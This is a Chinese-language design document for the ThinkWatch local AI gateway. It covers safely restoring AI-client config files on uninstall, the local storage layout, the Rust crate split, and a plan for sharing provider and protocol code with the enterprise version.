> **做了 ↑↓/Enter/Esc**（2026-09-11）。`⌘K` 和 `⌘F` 按原文往后排。
>
> 补的时候撞见一件更基本的事：**请求页的行根本打不开详情** —— §7.8 那个
> 右侧抽屉只在 Dashboard 里接了，而这里才是主战场。现在点行开抽屉，
> 键盘导航是它的第二条路。
>
> 两个边界：在输入框里打字时不接管方向键（否则光标动不了）；抽屉开着时
> `↑↓` 不动，那时用户在看详情而不是挑行。

### 7.15 退出路径：用户怎么把我们卸干净

这一节之前完全没有，而它是**接管功能能不能让人放心按下去的前提**。

想清楚这个场景：用户接管了五个客户端，用了三个月，然后决定不用了——**把 App 拖进废纸篓**。

于是：五个客户端的配置文件里，`base_url` 全都指向 `http://127.0.0.1:8788`，而那个端口后面已经没有任何东西了。**所有 AI 客户端同时失效**，而用户很可能已经忘了是什么改的、原来的值是什么。

**macOS 上删除应用没有卸载钩子。** 拖进废纸篓就是拖进废纸篓，我们没有任何机会做清理。这不是「以后再说」的问题——它必须在写第一个字节到用户配置文件**之前**就设计好。

#### 三层，从被动到主动

**第一层（最重要，成本几乎为零）：哨兵注释里写明原值。**

§7.11 已经要求加哨兵标记来区分哪些字段是我们写的。**把原值一起写进去**：

```jsonc
{
  // === ThinkWatch 接管开始 ===
  // 原值: "https://api.anthropic.com"
  // 要手动还原: 把下面这行改回上面那个值，删掉本段注释
  "ANTHROPIC_BASE_URL": "http://127.0.0.1:8788",
  // === ThinkWatch 接管结束 ===
}
```

这一层的价值在于**它在我们完全不存在之后仍然有效**。用户打开文件，看一眼就知道该改回什么。**把「不可恢复」变成「看一眼就能恢复」，代价只是几行注释。**

TOML 同理。JSON 不支持注释的场合（严格解析器），退化为在同目录留一个 `.thinkwatch-takeover.json` 记录原值，并在接管确认框里说明这个文件的用途。

#### 第二层：一键还原，而且要一直看得见

哨兵注释是给「我们已经不在了」准备的兜底。**正常情况下用户不该需要手动改文件——他应该有一个按钮。**

**入口有三个，覆盖三种心情：**

| 位置 | 场景 |
|---|---|
| Clients 页每一行的「还原」 | 「Codex 我想改回去自己配」 |
| Clients 页顶部的「**全部还原**」 | 「我不用这个东西了」 |
| 设置页最底部的「完全卸载」 | 「我要删掉它」——内部调用全部还原，再问是否删数据目录，最后注销 LaunchAgent 并退出，给一句「可以把应用拖进废纸篓了」 |

> **三个入口现在都在了**（2026-09-11）。之前只有第一个（每行的「还原」）。
>
> 顺序是**先还原、再注销自启、最后才提删数据** —— 反过来的话，中途失败
> 会留下一个「客户端还指着一个不在的端口」的状态，而那正是这一整节要
> 防的事。数据目录**默认不删**：请求历史和成本记录是用户自己的东西，
> 而「删了才发现还想看」是不可逆的。
>
> **一家失败不影响别家**：五个客户端里有一个的文件被改坏了，不该让另外
> 四个也留在接管状态 —— 所以逐个还原、逐条报结果，而不是只说一句
> 「失败了」。
>
> 确认走自己的界面，**不弹浏览器的 `confirm`** —— 这个项目里所有破坏性
> 操作都走自己的确认界面（接管走 diff 弹窗）。

**这个按钮要一直可见，不能藏在二级菜单里。** 用户敢按下「接管」的前提，就是**看得见退路**。藏起来的退路等于没有退路——他会在心里给这个操作打上「不可逆」的标签，然后犹豫。

#### 还原和回滚是两个操作，长得很像，用错会毁数据

这是这一节最容易做错的地方。

| | 数据来源 | 语义 | 什么时候用 |
|---|---|---|---|
| **回滚** | 接管时的**全文备份** | 把文件整个变回三个月前 | 「我们写坏了这个文件」 |
| **还原** | 哨兵注释里的**原值** | 只把我们改的那几个字段改回去 | 「我不用这个网关了」 |

**卸载走的必须是「还原」。** 如果拿全文备份去覆盖，用户这三个月里在那个文件上做的所有其他改动——新加的 MCP server、调过的权限、写的 hook——**全部消失**。

这正是 §9.7 那条「还原不能擦掉我们没管的文件」的具体形态：cc-switch 的还原逻辑清空了用户手写的 `CLAUDE.md`，因为那个文件从来不在同步内容里，却被当成「属于这个 app 的状态」一起还原了。**还原的作用域必须和写入的作用域严格一致**——我们写了哪几个字段，就只还原哪几个字段，然后把哨兵注释一起删掉。

#### 四个必须处理的情况

**一、原值可能已经过期。** 三个月前接管时记下的 key 是 `sk-old`，用户后来在我们这边换成了 `sk-new`，上游那把老的早就吊销了。还原会写回一把死 key。

**处理方式和接管对称：展示 diff 让用户确认。** 他看到「要写回 `sk-old...`」就知道该顺手更新一下。**我们不猜哪个是对的**——那是他的账号。

**二、部分失败不能静默。** 五个客户端，第三个的配置文件在我们不知道的时候变成了指向只读位置的符号链接。**逐个报告，不要给一个笼统的「还原完成」**：

```
✅ Claude Code    已还原
✅ Codex          已还原
⚠️ Cline          失败：配置文件不可写
   → 哨兵注释里有原值，可以手动改：[打开文件]
✅ Gemini CLI     已还原
✅ OpenCode       已还原
```

失败那一条要**直接给出手动路径**——这正是第一层存在的意义。

**三、文件被替换或删掉了。** 用户重装过客户端、或者手动删了配置。这时候没有哨兵注释可循，**如实报告「这个客户端的配置已经不是我们接管的那份了，未做改动」**，不要试图猜着写点什么进去。

**四、还原之后同样要重启客户端。** 而且**分两类**（§7.11）：Claude Code 和 Gemini CLI 热重载，Codex 那类必须关掉终端重开。还原完成的那一屏要按客户端说对——**接管时说错顶多让人多等，还原时说错会让人以为没还原干净。**

#### 一条容易漏掉的实现约束：还原走控制面，不依赖数据面

**网关挂了的时候，恰恰是最想还原的时候。**

所以「还原」必须只依赖控制面（文件读写 + 哨兵解析），不碰路由、不碰上游、不需要数据面活着。§2.2.1 的安全模式（只起控制面）里，**还原按钮必须是可用的**。

这条和 §2.2.1「网关挂了的时候用户最需要的恰恰就是能改配置」是同一条原则的两个面。

**第三层：core 启动失败时不要静默。** 如果用户没走卸载流程直接删了 App，客户端会连不上 8788。这时候客户端自己的报错是「connection refused」，看不出原因。这一层我们无能为力——**所以第一层才是真正的兜底**。

#### M4 实现时补上的四条

**一、旁文件贴着配置文件命名，不在目录里放一个固定名字的东西。**

`settings.json` 旁边是 `settings.json.thinkwatch.json`。理由有两个：一眼能看出它在说谁；两个客户端共用一个目录时不会撞。`.aider.conf.yml` 就在 home 根目录，那儿放一个泛泛的 `.thinkwatch-takeover.json` 既容易撞、又说不清。

**二、原值是三态，不是「有值 / 没值」两态。**

第三态是「原值是个密钥」。它存在的理由很具体：

| 写到哪 | 密钥要不要抄进去 | 为什么 |
|---|---|---|
| **同一个文件的注释** | 要 | 它本来就在那个文件里、同一套权限，写一遍不多一处暴露；而少写它，用户就没法手动还原了 |
| **旁文件** | **不要** | 那是我们新造的一份文件，抄进去就是多一份密钥副本，何况那个目录常常被 dotfile 管理器提交进 git |

分工因此变成：**旁文件说「我们动过哪几个字段」，全文备份说「它们原来是什么」**。密钥类的原值一份都不用抄进旁文件，也不会因此丢失。备份真的不在了的时候，还原会把那个字段删掉并明说「原来那儿是个密钥，你需要自己重新填一次」——留着我们的密钥比删掉更糟，那等于卸载之后还在替他发请求。

**三、重复接管不能覆盖「原值」的记录。**

第二次接管时，文件里的值**已经是我们上次写进去的**。照着现状记一遍，「原值」就变成了我们自己的地址和密钥，之后的还原会把用户还原到我们这儿。

**这是最隐蔽的一种数据丢失：每一步看起来都成功了。**所以接管前先读旁文件，有记录就以那一次的为准，并且**沿用第一次那份备份的路径**——这一次的备份里装的是已经被我们改过的文件。

**四、还原「原本没有的文件」要真的删掉它，但只在它还是空的时候。**

接管时如果 `settings.json` 不存在，我们会新建。还原时要把它整个删掉，否则会留下一个用户从来没有过的文件。但用户可能在这三个月里往里加了自己的东西——那时只撤掉我们那几个字段，文件留着。

#### 顺带一个相关的缺口：数据导出

用了半年，SQLite 里攒了几万条请求记录、成本、延迟。**用户想把它们拿出来看看**——报销、对比几家中转站的真实单价、或者只是好奇。

我们不做 cc-switch 那种整库 SQL 导出（§9.7 说过，单文件数据库直接拷贝比维护一套导出/导入更省事）。但**「导出为 CSV」是个合理的单用户需求**，而且它和零上传立场（§12）是一致的：**数据是你的，我们不上传，也不扣着不给。**

一个按当前筛选条件导出的按钮，几十行代码。放在 Requests 页。

## 8. 存储

零外部依赖，全部在 `~/.thinkwatch/`：

```
~/.thinkwatch/
  config.yaml          ★ 唯一的配置文件。UI、CLI、手改，全落这一份
  history/             配置快照，保留最近 50 个，用于回滚
  pricing.yaml         价格覆盖（可选，中转站的价格写这儿，§4.3.0）
                       ↑ 唯一的例外：那是个十万条的厂商数据集，用户改的是
                         其中几行**数据**。策略类的东西一律进 config.yaml
                         （扫描规则曾经跑到这儿开过一个文件，M6+ 时收回去了）
  data.db              SQLite · 请求历史 + 聚合 + 运行时状态
  blobs/2026-09-07/    请求/响应体，按天分目录
  adopted.json         客户端接管记录 + 原配置备份
  core.lock            pid + socket 路径 + 端口
  logs/
```

**你需要关心的只有 `config.yaml` 一个文件**——密钥也在里面（§3.2）。其余的要么是运行时数据（`data.db`、`blobs/`），要么是给程序自己用的（`core.lock`、`history/`），都不需要你打开过。

#### 磁盘不够时怎么办

保留策略（body 七天 / 总量 2 GB / metadata 九十天）是常规回收，但**磁盘可能在两次回收之间就满了**。所以还要一层硬保护：

| 触发 | 行为 |
|---|---|
| 剩余空间 < 1 GB | 停止写 blob，只记 metadata，UI 告警 |
| 剩余空间 < 200 MB | 停止一切写入，转为纯转发，托盘变黄 |
| 写入失败 | 同上，并把失败计入日志（日志本身也可能写不进去，那就只留内存） |

**任何一种情况都不拒绝服务**——这是 §4.7 那条原则的具体落地：观测挂了，代理照跑。

日志按天切分并同样受总量约束，超了删最旧的。`logs/` 不做无限增长。

运行时状态（健康、熔断、延迟 EWMA、规则命中计数）并进 `data.db`，不单独开文件——它不是配置，是系统观测的结果。

**metadata 进 SQLite，body 进文件系统。** 这是刻意的分离：

- metadata 每条约 500 字节，10 万请求 = 50 MB，SQLite 轻松处理，且支持复杂查询。
- body 可能几百 KB（长上下文场景）。塞进 SQLite 会让数据库膨胀到 GB 级，VACUUM 慢、备份慢、GC 难。存文件系统，按天分目录，过期直接 `rm -rf` 整个目录，GC 成本 O(1)。

**保留策略**：body 默认 7 天 / 总量上限 2 GB；metadata 默认 90 天。都可配。达到上限时从最旧的天目录开始删。

**实时数据走内存 ring buffer**，最近 1000 条。UI 打开立刻有数据，不查 DB。

---

## 9. Core 的 crate 划分

> 名字维持现状（§14），crate 前缀就是 `tw-`。

### 9.0 先看全景：谁依赖谁

两个常见的误解，先澄清：

- **企业版特有的代码不在 core 里。** 多租户、RBAC、审计、ClickHouse、MCP 网关这些全部留在 `ThinkWatch` 仓库。core 里没有「企业版的那一层」——不仅因为桌面版用不到，更因为 §9.2 的 License 方向：MIT 的 core 可以被 BUSL 依赖，反过来不行。把企业版特有代码放进 MIT 库，法律上和语义上都是错的。
- **CLI 不是一层。** 它是 `twcore` 这个 bin 里的一组子命令，依赖的是第二层的 `tw-api`。

所以 core 里是**两层加一个 bin**：

```
┌──────────────────────────────────────────────────────────┐
│  ThinkWatch  ·  BUSL  ·  独立仓库                         │
│  多租户 · RBAC · 审计 · ClickHouse · MCP 网关 · 配额       │
└────────────────────────┬─────────────────────────────────┘
                         │ 只依赖第一层
                         ▼
╔══════════════════════════════════════════════════════════╗
║  thinkwatch-core  ·  MIT                                 ║
║                                                          ║
║  ┌─ 第一层 · 共用协议层 ───────────────────────────────┐ ║
║  │  tw-types   tw-protocol   tw-provider               │ ║
║  │  tw-resil   tw-redact     tw-pricing                │ ║
║  │  改动要谨慎，两边都受影响                             │ ║
║  └─────────────────────▲───────────────────────────────┘ ║
║                        │                                 ║
║  ┌─ 第二层 · 桌面网关 ──┴───────────────────────────────┐ ║
║  │  tw-config  tw-engine   tw-guard    tw-store        │ ║
║  │  tw-observe tw-gateway  tw-control  tw-secret       │ ║
║  │                                                      │ ║
║  │  tw-api  ← 控制面契约。CLI 和 Tauri 共同依赖它        │ ║
║  │  企业版永不依赖这一层，随便改                          │ ║
║  └──────────────────────────────────────────────────────┘ ║
║                                                          ║
║  bin: twcore                                             ║
║    ├─ serve            用第一层 + 第二层全部              ║
║    └─ config / route / provider / group   只用 tw-api    ║
╚═══════════════════════╤══════════════════════════════════╝
                        │ 只依赖 tw-api，走 unix socket
                        ▼
┌──────────────────────────────────────────────────────────┐
│  thinkwatch-lite  ·  MIT  ·  独立仓库                     │
│  Tauri 壳 + React UI，没有引擎                            │
└──────────────────────────────────────────────────────────┘
```

#### 四个消费者，但它们不对应 core 的分层

容易混淆的地方在于「消费者的数量」和「层的数量」不是一回事：

| 消费者 | 依赖什么 | 怎么跑 |
|---|---|---|
| 企业版 `ThinkWatch` | **只有第一层** | 编译进自己的二进制 |
| `twcore serve` | 第一层 + 第二层全部 | 独立进程 |
| CLI（`twcore config …`） | **只有 `tw-api`** | 连 unix socket |
| 桌面 UI（Tauri） | **只有 `tw-api`** | 连 unix socket |

最后两行是同一件事的两个前端。**这正是 `tw-api` 必须独立成 crate 的原因**（§9.5）——它是唯一被两个不同前端共同依赖的东西，不独立就会被抄成两份然后漂移。

---

### 9.0.1 crate 清单

分两层，理由见上：第一层是企业版和桌面版共用的契约，改动要谨慎；第二层只有桌面版用，随便改。

#### 第一层 · 共用协议层（企业版也依赖）

| crate | 职责 | 来源 |
|---|---|---|
| `tw-types` | 共享类型，零依赖 | 新写 |
| `tw-protocol` | 四种方言的 DTO 与互转、SSE 分帧 | **搬** `sse_parser` + `streaming` + `transform`（900 行） |
| `tw-provider` | provider 抽象与七家实现 | **搬** `providers/*`（2,875 行，零改动） |
| `tw-resil` | 重试、熔断、故障转移 | **搬** `retry` + `cb_registry` + `failover`（968 行） |
| `tw-redact` | 出站脱敏与流式还原 | **搬** `pii_redactor` 那三件（1,618 行） |
| `tw-crypto` | AES-GCM 信封加解密 | **搬** `crypto.rs` + `json_secret.rs`（332 行）。企业版用，桌面版当前不调用 |
| `tw-pricing` | 价目表、成本计算、计费模式 | 新写。金额编码用 `cost_decimal.rs` |

#### 第二层 · 桌面网关（企业版永不依赖）

| crate | 职责 | 来源 |
|---|---|---|
| `tw-config` | YAML schema、加载、校验、双向同步（§3.8） | 新写。热重载借鉴 `dynamic_config.rs` 的 typed getter + `ArcSwap` |
| `tw-secret` | 环境变量插值、密钥打码 | 新写，很薄（§3.2） |
| `tw-engine` | 路由规则引擎（§3.4）、策略组 | 规则引擎新写；**搬** `strategy.rs`、`channel.rs`、`prefix_balancer.rs` |
| `tw-guard` | 工具调用审查、配置面静态扫描（§5.2、§5.3） | 全新，无可复用 |
| `tw-store` | SQLite、blob、GC | 新写 |
| `tw-observe` | 事件总线、ring buffer、聚合 | 新写 |
| `tw-gateway` | 数据面 HTTP 服务 | 新写。管线借鉴 `lifecycle/state.rs` 的 typestate |
| `tw-control` | 控制面 API 的服务端 | 新写 |
| `tw-api` | **控制面的契约**：请求/响应类型 + client。CLI、Tauri、第三方都依赖它 | 新写，见 §9.5 |

#### bin

| | | |
|---|---|---|
| `twcore` | `serve` 模式 + 客户端子命令 | 新写，见 §2.1.1、§9.5 |

第一层标「搬」的合计 **6,361 行**（protocol 900 + provider 2,875 + resil 968 + redact 1,618 + crypto 332，其中 redact 是 M5 才用），全部是经过生产验证的代码。

> **和 §9.1 那个 12,308 是两个口径，别混。** 这里的 6,361 是**六个第一层 crate 的主体代码**；§9.1 的 12,308 是逐文件核查后**全部可复用的行数**，包含散落在别处的工具函数（任务监督、金额编码、时间窗算法等）和小改后能用的部分。前者是「第一批要搬的」，后者是「总共能搬多少」。

### 9.1 从企业版能搬多少（逐文件核查过）

我把 `crates/gateway`、`crates/common`、`crates/test-support` 三个 crate 的每个文件都过了一遍，按耦合程度分四档。**结论比初稿的估计大得多**：初稿说 3900 行，实际是 —

| 档位 | 文件数 | 总行数 | 非测试行 | 含义 |
|---|---|---|---|---|
| **CLEAN** | 43 | **10,277** | 7,051 | 零 DB / Redis / 租户耦合，原样复制 |
| **NEAR** | 11 | 2,031 | 1,607 | 1–3 处浅耦合，改十几到几十行 |
| **合计** | **54** | **12,308** | **8,658** | 三个 crate 共 26,875 行，**可直接拿走 38%，小改后 46%** |

REWRITE 档（算法值得留、实现绑死 Redis）另算：限流、配额、健康检查、缓存、动态配置。这些要重写成本地版，但**数据结构和状态机可以照抄**。

#### 四个高价值发现

**一、`strategy.rs` 是纯函数，唯一的 import 是 `std::str::FromStr`。** 241 行，路由权重计算 `compute_weights(strategy, signals, k)`，输入是三个普通字段（配置权重、EWMA 延迟、成功率）。原样复制。

但有个坑要记下：它的文档注释宣传了 cost 策略，**枚举里其实没有**，只有 `Weighted | Latency | Health | LatencyHealth`，代码里还有一行断言明确要求 `"cost"` 解析失败。所以 §3.5 的 `cheapest` 策略组要自己写。

**二、`failover.rs` 干净（576 行），而且它对首字节问题的处理和 §4.2 的设计完全一致** —— 明确拒绝流开始后重试，代码注释写着「For streaming we can only retry before the stream starts producing data」。三态熔断器的状态转换全在一个 `Mutex` 下，注释说明这是为了修一个「两个并发失败都观察到 Closed」的竞态。

**三、`protocol_relearn.rs` 里藏着我们要的那个原语。** 这是最有价值的单个发现。

`open_stream_with_relearn` 实现了这样一件事：在返回的流**内部**窥探第一个 item，如果它是个可重试的错误，就换个上游重开，然后把窥探到的 item 推回队首。它特意不在返回前 await 第一个 item，注释解释了原因 —— 那样会把响应头一直挂到首个 token 到达，改变每个流式请求的 time-to-headers，还会破坏客户端断连的记账。

**这正是 §4.2 说的「首字节前可透明切换」的通用实现**，而且已经在生产里跑过。目前它只对方言不匹配触发，但机制本身与错误类型无关 —— 把判定条件放宽到任意可重试错误，就得到通用的流式故障转移。唯一的耦合是一个只被 `persist()` 用到的 `PgPool` 参数，解耦约 40 行。

**四、`crypto.rs` + `json_secret.rs` 干净可搬，但桌面版用不上了。** AES-256-GCM 带版本化信封，未知版本显式拒绝；外层把它包成 `{"$enc": ...}` 的 JSON 信封。两个文件合计 332 行，都是 CLEAN 档。

§3.2 改成明文存密钥之后，桌面版不再需要它们。但它们仍然值得放进 core 的第一层——**企业版要用**（凭据在数据库里是加密的），而且 §3.6 的 OAuth 凭据类型如果做了，刷新令牌落盘也需要加密。属于「core 有、桌面版当前不调用」的部分。

一个细节：magic bytes 里嵌了 `TW` 两个字节。既然决定不改名（§14），这里可以原样沿用——省掉了一次全量密文迁移。

#### 另外几个顺手的

| 文件 | 行数 | 用途 |
|---|---|---|
| `retry.rs` | 198 | 指数退避 + 抖动，零依赖。唯一限制是 `should_retry` 是裸函数指针不是闭包，捕获不了状态 |
| `cb_registry.rs` | 194 | 熔断状态的观测汇总，进程级 `OnceLock`。桌面版建议改成自有结构体，省得测试要串行 |
| `tasks.rs` | 175 | `supervised_spawn`，panic 隔离的任务守护。对「core 必须稳」直接有用 |
| `cost_decimal.rs` | 116 | scaled-i64 的金额编码，为 ClickHouse 写的，对 SQLite 一样适用 |
| `channel.rs` | 446 | 优先级组 + 加权随机调度，用字符串 id 不是 Uuid |
| `prefix_balancer.rs` | 361 | KV-cache 亲和的负载均衡，正好用在本地 vLLM / Ollama 上 |
| `lifecycle/state.rs` | 196 | typestate 管线 `Raw → LimitsChecked → Authorized → Invoked → Emitted`，纯类型 |
| `pii_redactor.rs` 等三件 | 1,618 | 本地脱敏与内容过滤，全干净。桌面版不是必需，但对隐私敏感场景是加分项，可放 M5 |
| `mock_provider.rs` | 151 | test-support 里唯一干净的文件。有 SSE 分块的仿真上游，但**没有录制能力**，回放测试集要自己加 |

#### 一个必须先做的动作

`common/src/limits/mod.rs` 是两个文件粘在一起的 1,666 行：**46 到 750 行是纯逻辑**（窗口换算、约束合并、策略校验、各种类型定义），值得整体拿走；从 `list_rules` 往下全是 Postgres CRUD，共 33 处 sqlx 调用。

**必须先拆再复制。** 否则一个 `use` 就把 `sqlx` 拖进本该干净的 core 库，然后你会花半天去理解为什么一个桌面应用要链接 Postgres 驱动。

#### 建议的提取顺序

第一批就能拿到一个能跑的多 provider 客户端，零改动：

```
providers/*  +  sse_parser  +  streaming  +  strategy
             +  failover    +  cb_registry +  retry      ≈ 4,900 行
```

这批下来就有了流式、熔断、加权路由。接着加 `router.rs`（Uuid 换成字符串，约 15 行）和 `protocol_relearn.rs`（去掉 `persist`，约 40 行），路由层就齐了。脱敏那三件随时可以无痛加。

### 9.2 License 已定：core 与桌面版都是 MIT

企业版保持 BUSL-1.1，`thinkwatch-core` 和桌面应用走 MIT。全部版权归属同一人，不存在授权障碍。

唯一的硬约束是**方向**：

> MIT 的库可以被 BUSL 的软件依赖，反过来不行。所以代码只能从 core 流向企业版。

具体含义：任何进入 core 的代码从此就是 MIT，**企业版特有的东西永远不进 core**——多租户、RBAC、审计合规、OIDC、MCP 网关、ClickHouse 分析，这些留在 BUSL 一侧。反过来，core 里的一切企业版都可以自由使用。

这不是妥协，这就是正确的依赖方向：底层协议适配是公共品，上层的治理和合规才是商业价值所在。

### 9.3 反向依赖：现在就做，但按稳定性分层

**目标明确：同一份代码只写一次，企业版和桌面版共用 core。**

上一版我建议推迟到后期，理由是 core 接口未定型。重新评估之后我改主意了——推迟的理由站不住：

- 两个项目同一个人写，同一台机器上，`~/Dev/` 下并排放着。没有跨团队协调成本，没有版本发布流程。
- 用 **Cargo 路径依赖**而不是 crates.io 发布，改 core 接口时企业版立刻编译报错，同一个 IDE 里一次改完。这比「先复制、几个月后再合并」的返工小得多。
- 复制出来的两份代码，漂移是必然而不是可能。协议适配层尤其经不起漂移——它的正确性完全依赖于对上游行为的准确追踪，两份实现意味着两套追踪。

```toml
# ThinkWatch/Cargo.toml
[workspace.dependencies]
tw-provider = { git = "https://github.com/ThinkWatchProject/ThinkWatch-Core.git", branch = "main" }
tw-protocol = { git = "https://github.com/ThinkWatchProject/ThinkWatch-Core.git", branch = "main" }
```

#### 但不是全部一起切，按接口稳定性分三层

这是关键的判断：**不同层的接口，稳定性来源完全不同。**

| 层 | 何时切 | 为什么 |
|---|---|---|
| **立即切**<br>`tw-provider`、`tw-protocol`、`tw-crypto`、`tw-resil` | 现在 | 这些的接口**由外部现实决定**，不由我们的产品需求决定。Anthropic 的 SSE 事件格式、OpenAI 的工具调用结构、AES-GCM 的信封布局——桌面版再怎么演进也不会改变它们。这层已经生产验证过，接口天然稳定 |

> **注意 `tw-crypto` 和 `tw-secret` 是两个东西**，v0.8 改成明文存密钥时这里没跟上：
> - `tw-crypto`（第一层）——AES-GCM 信封，**企业版要用**（它的凭据在数据库里是加密的），桌面版当前不调用
> - `tw-secret`（第二层）——环境变量插值、密钥打码显示，**只有桌面版用**
>
> §9.4 边界清单里那条「密钥加解密 ❌ 不进 core」说的是**密钥管理策略**（从哪读、怎么存），不是加密原语本身。原语是纯算法，属于第一层。
| **M2 后切**<br>`tw-pricing`、`tw-engine` 的策略部分 | 桌面版跑通观测之后（M3） | 定价模型和路由策略会因为桌面场景的需求（订阅计费、cheapest 策略）而演进，等它稳下来 |
| **可能永不切**<br>`tw-gateway`、`tw-control`、`tw-store`、`tw-observe` | 不切 | 单机 SQLite 和多租户 Postgres、unix socket 和多端口 HTTP、ring buffer 和 ClickHouse——需求差异太大，强行统一只会造出一个两边都别扭的抽象 |

第一层就是 §9.1 里那 4,900 行零改动的部分，**恰好就是最值得共用、也最安全共用的那批**。这不是巧合：一段代码之所以对数据库零耦合，正是因为它只关心外部协议。

#### 切之前有一个必须做的重构

企业版的 `ChatCompletionRequest` 里塞了两个多租户字段：`caller_user_id` 和 `caller_user_email`，用来解析自定义请求头模板里的占位符。这两个字段不该进 core。

正确的做法不是加个泛型糊过去，而是**把调用上下文从请求体里拿出来**，作为独立参数传给 provider 方法：

```rust
// 现在（企业版）
provider.chat_completion(request)          // request 里混着 caller 身份

// 之后（core）
provider.chat_completion(&request, &ctx)   // ctx: 桌面版传空，企业版传身份
```

这本来就是更干净的设计——请求体描述「要什么」，上下文描述「谁在要」，两件事不该揉在一个结构里。企业版重构后自己也更清晰。

工作量：七个 provider 文件的方法签名，加上调用方。这些方法本来就都是 async，改签名是机械劳动，一次做完。

**建议把这个重构排在 M0 第一周**，早于任何桌面版业务代码。因为它决定了 core 的公开接口长什么样，晚做就要返工两次。

### 9.4 企业版具体怎么调用 core

上一节只说了「用路径依赖」和「要做接口重构」，没说接口长什么样。补上。

#### 一条原则决定全部设计

> **core 不拥有配置的来源，也不拥有数据的去向。它只负责把请求正确地发出去、把响应正确地解析回来。**

桌面版的配置来自 YAML，企业版来自 Postgres；桌面版的用量写 SQLite，企业版写 ClickHouse。这些差异**一条都不该渗进 core**。core 的输入是纯数据结构，输出也是纯数据结构，中间不碰任何存储。

#### 三个接缝

| 接缝 | 方向 | core 的立场 |
|---|---|---|
| `ProviderSpec` | 进 | 纯数据。不关心你从 YAML、数据库还是环境变量拼出来的 |
| `CallCtx` | 进 | 开放的属性字典。core 只做字符串替换，不理解语义 |
| `Usage` / `CoreError` | 出 | 只返回，绝不持久化 |

```rust
// ── tw-provider 的公开接口 ────────────────────────

/// 纯数据。core 不关心它从哪来。
pub struct ProviderSpec {
    pub protocol:  UpstreamProtocol,      // anthropic | openai-chat | …
    pub base_url:  String,
    pub credential: Credential,
    pub headers:   Vec<(String, String)>,
    pub timeout:   Duration,
    pub model_map: Vec<(String, String)>,
}

pub enum Credential {
    None,
    /// 覆盖 Authorization: Bearer / x-api-key / api-key 三种形态，
    /// 差别只是 header 名字不同，provider 自己不需要知道。
    Header { name: String, value: String },
    AwsSigV4 { access_key: String, secret_key: String, region: String },
    /// OAuth，见 §3.6。core 定义 trait，具体实现可以在调用方。
    Dynamic(Arc<dyn CredentialSource>),
}

/// 调用上下文。桌面版基本用不上，企业版塞租户信息。
#[derive(Default)]
pub struct CallCtx {
    pub trace_id: String,
    /// 企业版放 user_id / user_email，供请求头模板插值使用。
    /// core 只做 {{key}} → value 的替换，不理解这些键的含义。
    pub attrs: HashMap<String, String>,
}

#[async_trait]
pub trait Provider: Send + Sync {
    async fn invoke(&self, req: &ChatRequest, ctx: &CallCtx)
        -> Result<ChatResponse, CoreError>;
    async fn stream(&self, req: &ChatRequest, ctx: &CallCtx)
        -> Result<ChatStream, CoreError>;
}

pub fn build(spec: &ProviderSpec) -> Result<Arc<dyn Provider>, CoreError>;
```

`CallCtx.attrs` 用字典而不是具体字段，是刻意的：企业版将来要加一个 `team_id` 到请求头模板里，不需要改 core 一行代码。

#### 两边各自怎么用

```rust
// ── 桌面版 ──────────────────────────────────────
let spec = ProviderSpec::from(&cfg.providers[i]);   // serde 直接从 YAML 反序列化
let p    = tw_provider::build(&spec)?;
let resp = p.invoke(&req, &CallCtx::default()).await?;
store.record(&resp.usage)?;                          // 写本地 SQLite

// ── 企业版 ──────────────────────────────────────
let row  = sqlx::query_as!(ProviderRow, "…").fetch_one(&pool).await?;
let spec = ProviderSpec {
    protocol: row.protocol.parse()?,
    base_url: row.base_url,
    credential: Credential::Header {
        name:  row.auth_header,
        value: crypto::decrypt(&row.encrypted_key, &master)?,  // 解密留在企业版
    },
    headers:   row.custom_headers,
    timeout:   Duration::from_secs(row.timeout_secs as u64),
    model_map: row.model_map,
};
let p   = tw_provider::build(&spec)?;
let ctx = CallCtx {
    trace_id: trace.id().to_string(),
    attrs: HashMap::from([
        ("user_id".into(),    uid.to_string()),
        ("user_email".into(), email.clone()),
    ]),
};
let resp = p.invoke(&req, &ctx).await?;
clickhouse.insert(gateway_log(&resp.usage, uid, team_id)).await?;  // 写 CH
```

注意**密钥解密留在企业版**。core 拿到的已经是明文字符串——这正好也匹配桌面版的做法（§3.2 密钥本来就是明文）。加解密属于「配置的来源」，按上面那条原则就不该进 core。

#### 迁移不能一次切，企业版是生产系统

四步，每步都可回退：

| 步 | 做法 |
|---|---|
| **1** | core 抽出 `tw-provider`，企业版加依赖。**旧代码一行不删** |
| **2** | 并行期：新旧两套都在，用一个环境变量切换走哪套 |
| **3** | **用现有集成测试做等价性验证**：企业版 `test-support` 里那套 wiremock 打桩的上游，对同一组桩跑新旧两条路径，assert 输出一致。这是最便宜的验证方式，桩已经写好了 |
| **4** | 灰度：先切一个协议（比如只切 OpenAI Chat），观察一周，再全切，最后删旧代码 |

第 3 步是整个迁移的安全网。provider 层的 bug 通常很微妙——某个边界情况下少了一个字段、SSE 分帧在特定长度下出错——靠 review 看不出来，靠对同一组桩跑双路径能直接抓出来。

#### 依赖怎么写

初期 core 变动频繁，别急着发 crates.io：

```toml
# ThinkWatch/Cargo.toml
[dependencies]
tw-provider = { git = "https://github.com/…/thinkwatch-core", rev = "a1b2c3d" }

# 本地开发时覆盖成路径依赖，改 core 立刻在企业版里编译到
[patch."https://github.com/…/thinkwatch-core"]
tw-provider = { git = "https://github.com/ThinkWatchProject/ThinkWatch-Core.git", branch = "main" }
```

git 依赖 pin 到 commit，CI 能独立构建（不需要两个仓库并排存在）；`[patch]` 让本地开发保持「改一处、两边立刻编译」的体验。等 core 稳定了再发 crates.io，那时把 git 依赖换成版本号即可。

#### 边界清单：什么进 core，什么不进

| 模块 | 进 core | 理由 |
|---|---|---|
| provider / protocol / SSE 分帧 | ✅ | 形状由外部 API 决定，两边完全一样 |
| retry / 熔断 / 故障转移 | ✅ | 纯算法，无存储依赖 |
| 出站脱敏（§5.1） | ✅ | 两边都要——桌面版防中转站，企业版做合规 |
| 定价计算 | ✅ 但等 M2 | 算法一样，价目表的来源不同 |
| 权重计算（`strategy.rs`） | ✅ | 纯函数 |
| 密钥加解密 | ❌ | 桌面版明文、企业版 AES 加数据库。属于「配置来源」 |
| 配额 / 限流 | ❌ | Redis 脚本 vs 本地内存，实现完全不同 |
| 审计 / 存储 / 分析 | ❌ | ClickHouse vs SQLite |
| **路由规则引擎** | ❌ | **§3.4 那套 AI 语义的规则和企业版的路由表是两个模型**，强行统一只会造出一个两边都别扭的抽象 |
| 多租户 / RBAC / OIDC / MCP 网关 | ❌ | 企业版独有 |

